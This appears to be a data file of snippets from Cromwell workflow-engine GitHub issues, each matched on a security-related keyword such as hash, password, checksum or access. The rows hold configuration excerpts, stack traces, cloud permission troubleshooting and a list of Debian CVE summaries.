Security,"conf -jar cromwell-75.jar run hello.wdl -i hello.inputs; ; ![AWS-Batch](https://user-images.githubusercontent.com/25282254/153039990-0d0b2c96-a33b-454f-9617-aee83137337a.PNG); [Cromwell-Error.docx](https://github.com/broadinstitute/cromwell/files/8026009/Cromwell-Error.docx); ; <!-- Paste/Attach your workflow if possible: -->; java -Dconfig.file=aws-cromwell-batch.conf -jar cromwell-75.jar run hello.wdl -i hello.inputs. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; include required(classpath(""application"")). aws {. application-name = ""cromwell""; auths = [; {; name = ""default""; scheme = ""default""; }; ]; region = ""us-east-1""; }; engine {; filesystems {; s3.auth = ""default""; }; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }; docker {; hash-lookup {; enabled = false; # How should docker hashes be looked up. Possible values are ""local"" and ""remote""; # ""local"": Lookup hashes on the local docker daemon using the cli; # ""remote"": Lookup hashes on docker hub and gcr; method = ""remote""; }; }. backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; numSubmitAttempts = 10; numCreateDefinitionAttempts = 10; concurrent-job-limit = 1000; root = ""s3://cromwell-aws-hello/cromwell-execution""; auth = ""default""; default-runtime-attributes {; queueArn = ""arn:aws:batch:us-east-1:XXXXXXXXX:job-queue/python-batch"" ,; scriptBucketName = ""cromwell-aws-hello"" ; }; filesystems {; s3 {; auth = ""default""; }; }; # Emit a warning if jobs last longer than this amount of time. This might indicate that something got stuck in the cloud.; slow-job-warning-time: 24 hours; }; }; }; }. [Cromwell-Error.docx](https://github.com/broadinstitute/cromwell/files/8026013/Cromwell-Error.docx); ![AWS-Batch](https://user-images.githubusercontent.com/25282254/153040332-625cb61a-062b-4766-96ea-8e129efb2b20.PNG); [config file.docx](ht",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6671:2215,hash,hashes,2215,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6671,2,['hash'],['hashes']
Security,"corruption) or other unspecified behaviors. This crosses a privilege boundary in, for example, certain web-hosting environments in which a Control Panel allows an unprivileged user account to create subaccounts.; https://security-tracker.debian.org/tracker/CVE-2017-12424; -----------------------------------------; CVE-2018-13347: [High] ; Found in: mercurial [4.0-1+deb9u1]; Fixed By: ; mpatch.c in Mercurial before 4.6.1 mishandles integer addition and subtraction, aka OVE-20180430-0002.; https://security-tracker.debian.org/tracker/CVE-2018-13347; -----------------------------------------; CVE-2017-17458: [High] ; Found in: mercurial [4.0-1+deb9u1]; Fixed By: ; In Mercurial before 4.4.1, it is possible that a specially malformed repository can cause Git subrepositories to run arbitrary code in the form of a .git/hooks/post-update script checked into the repository. Typical use of Mercurial prevents construction of such repositories, but they can be created programmatically.; https://security-tracker.debian.org/tracker/CVE-2017-17458; -----------------------------------------; CVE-2017-12562: [High] ; Found in: libsndfile [1.0.27-3]; Fixed By: ; Heap-based Buffer Overflow in the psf_binheader_writef function in common.c in libsndfile through 1.0.28 allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact.; https://security-tracker.debian.org/tracker/CVE-2017-12562; -----------------------------------------; CVE-2018-1000001: [High] ; Found in: glibc [2.24-11+deb9u4]; Fixed By: ; In glibc 2.26 and earlier there is confusion in the usage of getcwd() by realpath() which can be used to write before the destination buffer leading to a buffer underflow and potential code execution.; https://security-tracker.debian.org/tracker/CVE-2018-1000001; -----------------------------------------; CVE-2016-2779: [High] ; Found in: util-linux [2.29.2-1+deb9u1]; Fixed By: ; runuser in util-linux allows local users to escape to the ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4979:2006,secur,security-tracker,2006,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4979,1,['secur'],['security-tracker']
Security,"cp`, as @aednichols suggested (in my case Cromwell runs with service account `30148356615-compute@developer.gserviceaccount.com`):; ```; $ gcloud config set account giulio@broadinstitute.org; Updated property [core/account].; $ gcloud auth list; Credentialed Accounts; ACTIVE ACCOUNT; 30148356615-compute@developer.gserviceaccount.com; giulio.genovese@gmail.com; * giulio@broadinstitute.org. To set the active account, run:; $ gcloud config set account `ACCOUNT`. $ gsutil cp gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram.crai /tmp/. Copying gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram.crai...; / [1 files][143.2 KiB/143.2 KiB]; Operation completed over 1 objects/143.2 KiB.; $ gcloud config set account 30148356615-compute@developer.gserviceaccount.com; Updated property [core/account].; $ gcloud auth list; Credentialed Accounts; ACTIVE ACCOUNT; * 30148356615-compute@developer.gserviceaccount.com; giulio.genovese@gmail.com; giulio@broadinstitute.org. To set the active account, run:; $ gcloud config set account `ACCOUNT`. $ gsutil cp gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram.crai /tmp/; AccessDeniedException: 403 30148356615-compute@developer.gserviceaccount.com does not have storage.objects.list access to the Google Cloud Storage bucket.; ```. So in this case the more appropriate questions would be:; 1) How do I get to have my service account `30148356615-compute@developer.gserviceaccount.com` have the same permissions as my personal account `giulio@broadinstitute.org`?; 2) How do I get Cromwell to run with my personal account `giulio@broadinstitute.org` instead of my service account?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665434782:1532,Access,AccessDeniedException,1532,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665434782,2,"['Access', 'access']","['AccessDeniedException', 'access']"
Security,crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19];   at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19];   at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$.withRetry(GcsFileSystemProvider.scala:44) ~[cromwell.jar:0.19];   at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider.crc32cHash(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19];   at cromwell.engine.backend.io.package$PathEnhanced$.hash$extension(package.scala:32) ~[cromwell.jar:0.19];   at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:65) ~[cromwell.jar:0.19];   at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:63) ~[cromwell.jar:0.19];   at wdl4s.values.WdlValue$class.computeHash(WdlValue.scala:63) ~[cromwell.jar:0.19];   at wdl4s.values.WdlSingleFile.computeHash(WdlFile.scala:39) ~[cromwell.jar:0.19];   at cromwell.engine.backend.WorkflowDescriptor.hash(WorkflowDescriptor.scala:229) ~[cromwell.jar:0.19];   at cromwell.engine.backend.jes.JesBackend$$anonfun$postProcess$1$$anonfun$apply$14.apply(JesBackend.scala:627) ~[cromwell.jar:0.19];   at cromwell.engine.backend.jes.JesBackend$$anonfun$postProcess$1$$anonfun$apply$14.apply(JesBackend.scala:626) ~[cromwell.jar:0.19];   at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19];   at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19];   at scala.collection.TraversableLike$WithFilter$$anonfun$foreach$1.apply(TraversableLike.scala:778) ~[cromwell.jar:0.19];   at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19];   at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19];   at scala.collection.TraversableLike$WithFilter$$anonfun$foreach$1.apply(TraversableLike.scala:778) ~[cromwell.jar:0.19];   a,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/810:3095,hash,hash,3095,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/810,1,['hash'],['hash']
Security,cromwell 28 checksum mismatch,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2463:12,checksum,checksum,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2463,1,['checksum'],['checksum']
Security,"cromwell : 47; wdl : version 1.0; SGE. It is found that some tasks can not hit cache, and the common feature of these tasks is that the MD5 value of ""call caching""-""hashes""-""input""-""file input bam"" contains the path (cromwell workdir) of the file:; ```; curl -X GET ""http://myserver:8082/api/workflows/v1/f6450b4b-926a-4cfe-a879-c0e3653f8bc2/metadata?expandSubWorkflows=true"" -H ""accept: application/json"" >metadata.json; ```; part of metadata.json:; ```; ""input"": {; ""String memory"": ""5BB45AB74E6536FF29BF9B2272D68AA3"",; ""String sample"": ""C59B185FAE4EAE4F0EDFDE1B62772C72"",; ->""File inputBam"": ""5b6a0c7aa65cbfcfe2e85ba8b326e5cd /TJPROJ6/GB_HUMAN/USER/aicancer/service/cromwell_humanReseq_hw/cromwell-executions/ToSomatic/487f5806-1c45-4d34-b2ca-c1a14af84100/call-Mapping/shard-0/Mapping/35a10f29-4a0a-461c-92ff-7f1d293cd321/call-bamMd5/inputs/1427979241/WESMSI_1.final.bam"",; ""Boolean block"": [; ""B326B5062B2F0E69046810717534CB09""; ],; ""Int cpu"": ""C4CA4238A0B923820DCC509A6F75849B"",; ""String workflowDir"": ""E0EA73CD86E0488226AB05800286E665"",; ""Int maxRetries"": ""C4CA4238A0B923820DCC509A6F75849B"",; ""String outputDir"": ""820E83FAC13C924AC573955CC2836C6B"",; ""String sge_queue"": ""4CD545F87E55F6DB707BFFBA55AB3028""; }; ```; The md5 value of bam entered contains the file path, but other tasks do not. ; What kind of settings or file transfer methods will lead to such differences? ; Will md5 value contains the file paths affect hit cache?; My WDL code:; ```; version 1.0; import ""tasks/mapping.wdl""; workflow Mapping {; input {; String sample; String novoid; String mappingDir; String genome; String referenceFasta; Boolean removedup; Array[Comair] cleanPairs; String? targetbed; Boolean recal = false; Boolean block = true; String tmpdir; String? sge_queue; String workflowDir; }; String finalBamPath = ""${mappingDir}/${sample}.final.bam""; call mapping.flag_stats as flagStats {; input:; sample = sample,; inputBam = finalBamPath,; outputDir = mappingDir,; block = [picardMarkdup.done],; sge_queue = sge",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6316:165,hash,hashes,165,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316,1,['hash'],['hashes']
Security,cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-ValidateReadGroupSamFile/shard-22/exec.sh; input_bam-0: gs://broad-gotc-int-cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-SortAndFixReadGroupBam/shard-22/HTC3GCCXX.8.Pond-536132.sorted.bam; ref_dict-0: gs://broad-references/hg38/v0/Homo_sapiens_assembly38.dict; ref_fasta-0: gs://broad-references/hg38/v0/Homo_sapiens_assembly38.fasta; ref_fasta_index-0: gs://broad-references/hg38/v0/Homo_sapiens_assembly38.fasta.fai; logging:; gcsPath: gs://broad-gotc-int-cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-ValidateReadGroupSamFile/shard-22/ValidateReadGroupSamFile-22.log; outputs:; HTC3GCCXX.8.Pond-536132.validation_report: gs://broad-gotc-int-cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-ValidateReadGroupSamFile/shard-22/HTC3GCCXX.8.Pond-536132.validation_report; ValidateReadGroupSamFile-22-rc.txt: gs://broad-gotc-int-cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-ValidateReadGroupSamFile/shard-22/ValidateReadGroupSamFile-22-rc.txt; projectId: broad-gotc-int; resources:; bootDiskSizeGb: 0; disks: []; minimumCpuCores: 0; minimumRamGb: 0; noAddress: false; preemptible: false; zones: []; serviceAccount:; email: default; scopes:; - https://www.googleapis.com/auth/compute; - https://www.googleapis.com/auth/devstorage.full_control; - https://www.googleapis.com/auth/genomics; - https://www.googleapis.com/auth/genomics; - https://www.googleapis.com/auth/compute; runtimeMetadata:; '@type': type.googleapis.com/google.genomics.v1alpha2.RuntimeMetadata; computeEngine:; diskNames:; - local-disk-12146155240789544851; instanceName: ggp-12146155240789544851; machineType: us-central1-b/n1-standard-2; zone: us-central1-b; startTime: '2016-09-28T04:07:00Z'; name: operations/EPuKyPf2KhiTn4qQ6vrzx6gBINj5z_mlEioPcHJvZHVjdGlvblF1,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1501:4278,Validat,ValidateReadGroupSamFile-,4278,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1501,1,['Validat'],['ValidateReadGroupSamFile-']
Security,cromwell.jar:0.19]; 905173- at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; 905174- at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$.withRetry(GcsFileSystemProvider.scala:44) ~[cromwell.jar:0.19]; 905175- at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider.crc32cHash(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; 905176- at cromwell.engine.backend.io.package$PathEnhanced$.hash$extension(package.scala:32) ~[cromwell.jar:0.19]; 905177- at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:65) ~[cromwell.jar:0.19]; 905178- at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:63) ~[cromwell.jar:0.19]; 905179- at wdl4s.values.WdlValue$class.computeHash(WdlValue.scala:63) ~[cromwell.jar:0.19]; 905180- at wdl4s.values.WdlSingleFile.computeHash(WdlFile.scala:39) ~[cromwell.jar:0.19]; 905181- at cromwell.engine.backend.WorkflowDescriptor.hash(WorkflowDescriptor.scala:229) ~[cromwell.jar:0.19]; 905182- at cromwell.engine.backend.jes.JesBackend$$anonfun$postProcess$1$$anonfun$apply$14.apply(JesBackend.scala:627) ~[cromwell.jar:0.19]; 905183- at cromwell.engine.backend.jes.JesBackend$$anonfun$postProcess$1$$anonfun$apply$14.apply(JesBackend.scala:626) ~[cromwell.jar:0.19]; 905184- at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19]; 905185- at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19]; 905186- at scala.collection.TraversableLike$WithFilter$$anonfun$foreach$1.apply(TraversableLike.scala:778) ~[cromwell.jar:0.19]; 905187- at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19]; 905188- at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19]; 905189- at scala.collection.TraversableLike$WithFilter$$anonfun$foreach$1.apply(Trav,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102:3856,hash,hash,3856,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102,1,['hash'],['hash']
Security,cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$.withRetry(GcsFileSystemProvider.scala:44) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider.crc32cHash(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.package$PathEnhanced$.hash$extension(package.scala:32) ~[cromwell.jar:0.19]; at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:65) ~[cromwell.jar:0.19]; at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:63) ~[cromwell.jar:0.19]; at wdl4s.values.WdlValue$class.computeHash(WdlValue.scala:63) ~[cromwell.jar:0.19]; at wdl4s.values.WdlSingleFile.computeHash(WdlFile.scala:39) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$8.apply(Backend.scala:193) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$8.apply(Backend.scala:193) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.mutable.ResizableArray$class.foreach(ResizableArray.scala:59) ~[cromwell.jar:0.19]; at scala.collection.mutable.ArrayBuffer,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:2517,hash,hash,2517,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['hash'],['hash']
Security,cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$.withRetry(GcsFileSystemProvider.scala:44) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider.crc32cHash(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.package$PathEnhanced$.hash$extension(package.scala:32) ~[cromwell.jar:0.19]; at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:65) ~[cromwell.jar:0.19]; at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:63) ~[cromwell.jar:0.19]; at wdl4s.values.WdlValue$class.computeHash(WdlValue.scala:63) ~[cromwell.jar:0.19]; at wdl4s.values.WdlSingleFile.computeHash(WdlFile.scala:39) ~[cromwell.jar:0.19]; at cromwell.engine.backend.WorkflowDescriptor.hash(WorkflowDescriptor.scala:229) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$postProcess$1$$anonfun$apply$14.apply(JesBackend.scala:627) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$postProcess$1$$anonfun$apply$14.apply(JesBackend.scala:626) ~[cromwell.jar:0.19]; at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618:2386,hash,hash,2386,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618,1,['hash'],['hash']
Security,"cs/repo-specific-configuration.md) file. _Have a fantastic day writing Scala!_. <details>; <summary>🔍 Files still referring to the old version number</summary>. The following files still refer to the old version number (0.9.0).; You might want to review and update them manually.; ```; centaur/src/main/resources/integrationTestCases/Somatic/CNV-Pair/cnv_somatic_pair_workflow_do_gc_wes.inputs; centaur/src/main/resources/integrationTestCases/Somatic/CNV-Panel/cnv_somatic_panel_workflow_do_gc_wes.inputs; centaur/src/main/resources/integrationTestCases/Somatic/Mutect2/Mutect2.aws.inputs; centaur/src/main/resources/integrationTestCases/Somatic/Mutect2/Mutect2.inputs; centaur/src/main/resources/integrationTestCases/germline/haplotype-caller-workflow/HaplotypeCallerWF.json; centaur/src/main/resources/integrationTestCases/germline/single-sample-production-workflow/PairedEndSingleSampleWf.options.json; centaur/src/main/resources/integrationTestCases/germline/single-sample-workflow/processing-for-variant-discovery-gatk4.hg38.wgs.inputs.json; centaur/src/main/resources/integrationTestCases/green/arrays/arrays.wdl; womtool/src/test/resources/validate/wdl_draft3/valid/HaplotypeCallerWF/HaplotypeCallerWF.inputs.json; womtool/src/test/resources/validate/wdl_draft3/valid/cnv_somatic_pair_workflow/cnv_somatic_pair_workflow.inputs.json; womtool/src/test/resources/validate/wdl_draft3/valid/joint-discovery-gatk/joint-discovery-gatk.inputs.json; ```; </details>; <details>; <summary>⚙ Adjust future updates</summary>. Add this to your `.scala-steward.conf` file to ignore future updates of this dependency:; ```; updates.ignore = [ { groupId = ""io.github.jbwheatley"" } ]; ```; Or, add this to slow down future updates of this dependency:; ```; dependencyOverrides = [{; pullRequests = { frequency = ""30 days"" },; dependency = { groupId = ""io.github.jbwheatley"" }; }]; ```; </details>. <sup>; labels: library-update, early-semver-major, semver-spec-minor, old-version-remains, commit-count:1; </sup>",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7294:1974,validat,validate,1974,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7294,3,['validat'],['validate']
Security,"ction(max_ram){ /* Get Max memory and subtract heap memory */ return max_ram - get_start_memory(); }""; ]; }; ],; ""baseCommand"": [; ""java"",; ""-Xms$(get_start_memory())m"",; ""-Xmx$(get_max_memory_from_runtime_memory(runtime.ram))m"",; ""-jar"",; ""/opt/linx/linx.jar""; ],; ""inputs"": [; {; ""type"": [; ""null"",; ""int""; ],; ""doc"": ""threshold for # SVs in clusters to skip chaining routine (default = 2000)\n"",; ""inputBinding"": {; ""prefix"": ""-chaining_sv_limit""; },; ""default"": 2000,; ""id"": ""#linx-1.10-beta.cwl/chaining_sv_limit""; },; {; ""type"": [; ""null"",; ""boolean""; ],; ""doc"": ""Optional - Discover and annotate gene fusions\n"",; ""inputBinding"": {; ""prefix"": ""-check_drivers""; },; ""default"": false,; ""id"": ""#linx-1.10-beta.cwl/check_drivers""; },; {; ""type"": [; ""null"",; ""boolean""; ],; ""doc"": ""Optional - discover and annotate gene fusions\n"",; ""inputBinding"": {; ""prefix"": ""-check_fusions""; },; ""default"": false,; ""id"": ""#linx-1.10-beta.cwl/check_fusions""; },; {; ""type"": [; ""null"",; ""string""; ],; ""doc"": ""[password]\n"",; ""inputBinding"": {; ""prefix"": ""-db_pass""; },; ""id"": ""#linx-1.10-beta.cwl/db_pass""; },; {; ""type"": [; ""null"",; ""string""; ],; ""doc"": ""[db_url]\n"",; ""inputBinding"": {; ""prefix"": ""-db_url""; },; ""id"": ""#linx-1.10-beta.cwl/db_url""; },; {; ""type"": [; ""null"",; ""string""; ],; ""doc"": ""[username]\n"",; ""inputBinding"": {; ""prefix"": ""-db_user""; },; ""id"": ""#linx-1.10-beta.cwl/db_user""; },; {; ""type"": [; ""null"",; ""File""; ],; ""doc"": ""list of known fragile sites - specify Chromosome,PosStart,PosEnd - fragile_sites.csv\n"",; ""inputBinding"": {; ""prefix"": ""-fragile_site_file""; },; ""id"": ""#linx-1.10-beta.cwl/fragile_site_file""; },; {; ""type"": [; ""null"",; ""int""; ],; ""doc"": ""Distance upstream of gene to consider a breakend applicable\n"",; ""default"": 100000,; ""id"": ""#linx-1.10-beta.cwl/fusion_gene_distance""; },; {; ""type"": [; ""null"",; ""File""; ],; ""doc"": ""Known fusion pairs - specify FiveGene,ThreeGene by name\n"",; ""inputBinding"": {; ""prefix"": ""-fusion_pairs_csv""; },; ""id"": ""#linx-1.10-beta.cwl/fusion_",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826:22385,password,password,22385,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826,1,['password'],['password']
Security,ctor$$anonfun$executionResult$1.apply(JesAsyncBackendJobExecutionActor.scala:539); at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:980); at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1363); at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1391); at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1375); at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:563); at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185); at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153); at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93); at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:981); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.storage.spi.Def,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1782:4178,secur,security,4178,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1782,1,['secur'],['security']
Security,"ctor.scala:514); at akka.actor.Actor.aroundReceive$(Actor.scala:512); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:208); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527); at akka.actor.ActorCell.invoke(ActorCell.scala:496); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Optional value was not set and no 'default' attribute was provided; Optional value was not set and no 'default' attribute was provided; at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:60); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:56); at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:534); ... 39 common frames omitted. ```. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- 